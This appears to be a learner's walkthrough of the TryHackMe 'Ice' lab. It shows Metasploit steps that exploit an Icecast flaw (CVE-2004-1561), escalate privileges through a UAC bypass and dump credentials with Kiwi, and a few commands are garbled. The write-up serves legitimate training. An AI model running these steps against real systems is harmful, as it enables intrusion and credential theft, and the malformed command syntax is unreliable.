

# ICE B2R Walkthrough – TryHackMe

## 🕵️ About the Room

The **TryHackMe Ice** room is a beginner-friendly Capture The Flag (CTF) challenge designed to test basic penetration testing skills and methodologies. This room provides an opportunity to explore various enumeration techniques, uncover vulnerabilities, and exploit them to gain access to the target system.

Throughout this room, I learned how to:
✔ Perform network scanning and enumeration  
✔ Identify vulnerable services and CVEs  
✔ Use Metasploit for exploitation  
✔ Gain remote access and escalate privileges  
✔ Perform post-exploitation recon and extract sensitive credentials  

This walkthrough details the steps I took to successfully exploit the machine and extract useful information.

---

## ✅ Steps Taken to Solve the ICE room

### 1️⃣ Connecting to TryHackMe Network

First, I connected to the TryHackMe VPN to access the target machine:

\`\`\`bash
$ sudo openvpn Downloads/Ynos.ovpn
\`\`\`

This connected me securely to the TryHackMe network, allowing communication with the virtual lab environment.

---

### 2️⃣ Verifying Connectivity

After connecting, I verified that I could reach the target machine by pinging its IP address:

\`\`\`bash
$ ping (Ip of the machine)
\`\`\`

This confirmed that the machine was reachable and ready for scanning.

---

### 3️⃣ Running a Quick Scan Using Nmap

For initial reconnaissance, I ran a thorough scan with the following command:

\`\`\`bash
$nmap -sV -O -T5 -p- 10.10.77.72 -oN Nmap.results
\`\`\`

This scan checks:
- All ports (\`-p-\`)
- Service versions (\`-sV\`)
- Operating system detection (\`-O\`)
- Aggressive timing template for faster results (\`-T5\`)
- Output saved to \`Nmap.results\`

---

### 4️⃣ Checking for Web Services

I checked if the machine hosted any websites but found that **no web service** was available on this target.

---

### 5️⃣ Reviewing the Open Ports

The Nmap scan revealed several open ports, including:
- Microsoft Remote Desktop Protocol (MSRDP)
- Port \`8000\` running Icecast service

This indicated that remote services could be exploited for initial access.

---

### 6️⃣ Identifying the Icecast Vulnerability

Icecast is a streaming media server known to have vulnerabilities, especially in older versions. Upon investigation, I found that this machine was exposing it, and the related CVE is:

\`\`\`text
CVE-2004-1561
\`\`\`

This vulnerability can be exploited using known payloads in Metasploit.

---

### 7️⃣ Using Metasploit for Exploitation

To exploit the Icecast vulnerability, I started Metasploit and prepared an environment:

\`\`\`bash
$ spool icecast
\`\`\`

This created a log file named \`icecast\` where all findings from this session would be saved.

---

### 8️⃣ Searching for the Exploit

Next, I searched for the CVE within Metasploit:

\`\`\`bash
$ search cve:2004-1561
\`\`\`

This listed the available exploits for this vulnerability.

---

### 9️⃣ Selecting the Exploit

The search results showed the exploit at index \`0\`. I loaded it with:

\`\`\`bash
$ use 0
\`\`\`

---

### 🔟 Setting Target Parameters

After loading the exploit, I checked the required options:

- \`LHOST\`: Local host interface to receive the callback  
- \`RHOST\`: Target IP address  

I set them accordingly:

\`\`\`bash
lhost = tun0
rhosts = ip of the target
\`\`\`

---

### 1️⃣1️⃣ Launching the Attack

With all configurations in place, I started the exploit:

\`\`\`bash
$ exploit
\`\`\`

The attack was launched, and I gained access to the target system via Meterpreter.

---

### 1️⃣2️⃣ Gathering Initial Recon

After gaining shell access, I ran the following commands to gather user information and system details:

\`\`\`bash
$getuid
$sysinfo
\`\`\`

These commands confirmed that I had access and provided environment details.

---

### 1️⃣3️⃣ Running Local Exploit Suggestions

For further enumeration and privilege escalation paths, I ran:

\`\`\`bash
$post/multi/recon/local_exploit_suggester
\`\`\`

This suggested possible exploits based on the current environment.

---

### 1️⃣4️⃣ Escalating Privileges

Following the suggestions, I executed a privilege escalation exploit:

\`\`\`bash
$exploit/windows/local/bypassuac_eventvwr
\`\`\`

---

### 1️⃣5️⃣ Backgrounding the Session

After running the exploit, I sent the session to the background to prepare for the next step:

\`\`\`bash
$background
\`\`\`

---

### 1️⃣6️⃣ Configuring Options Again

I opened the exploit options, set the Meterpreter session ID, and configured \`LHOST\` as \`tun0\`.

---

### 1️⃣7️⃣ Running the Exploit Again

With everything configured, I launched the exploit again:

\`\`\`bash
$exploit
\`\`\`

---

### 1️⃣8️⃣ Migrating to Gain Administrator Access

To fully escalate privileges, I migrated the session to another process:

\`\`\`bash
$migrate -N PROCESS_NAME 1372
\`\`\`

This process migration allowed me to gain admin access.

---

### 1️⃣9️⃣ Confirming Admin Access

I verified the privilege escalation by running:

\`\`\`bash
$getuid
\`\`\`

The output confirmed that I now had administrative access.

---

### 2️⃣0️⃣ Extracting Passwords Using Kiwi

For post-exploitation, I loaded the Kiwi extension to extract credentials:

\`\`\`bash
$load kiwi
\`\`\`

---

### 2️⃣1️⃣ Viewing Available Commands

To explore what Kiwi could do, I ran:

\`\`\`bash
help
\`\`\`

---

### 2️⃣2️⃣ Extracting All Credentials

Finally, I extracted all stored credentials using:

\`\`\`bash
$creds_all
\`\`\`

This revealed sensitive information from the target machine.

---

## ✅ What I Learned

- How to perform network scanning and OS detection using Nmap  
- How to identify vulnerable services such as Icecast  
- How to research vulnerabilities using CVE identifiers  
- How to exploit services with Metasploit  
- How to configure attack parameters (\`LHOST\`, \`RHOST\`)  
- How to escalate privileges using local exploits  
- How to perform post-exploitation tasks such as dumping credentials  
- How to maintain sessions and migrate processes for better control  

---

## 📂 Conclusion

The **ICE CTF** provided hands-on experience in exploiting real-world vulnerabilities and taught me essential techniques for reconnaissance, exploitation, privilege escalation, and credential extraction. This challenge sharpened my skills in identifying risks and using the right tools to exploit them in a controlled environment.

This walkthrough is part of my cybersecurity learning journey, and I hope it helps others looking to build practical hacking and penetration testing skills.
